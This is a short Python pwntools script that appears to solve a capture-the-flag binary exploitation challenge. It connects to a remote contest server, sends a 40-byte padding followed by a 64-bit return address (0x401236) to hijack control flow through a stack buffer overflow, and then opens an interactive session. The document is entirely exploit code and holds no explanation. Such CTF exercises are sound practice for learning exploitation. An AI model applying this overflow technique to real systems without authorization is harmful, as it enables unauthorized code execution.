from pwn import *
import struct

offset = 40

b32 = lambda x: struct.pack("I", x)
b64 = lambda x: struct.pack("Q", x)

# elf = ELF("./wah") Local
p = remote("challs.actf.co", 31224)

message = p.recv()
print("Got " + message.decode())

payload = b'A' * offset + b64(0x401236)

p.send(payload)

p.interactive()
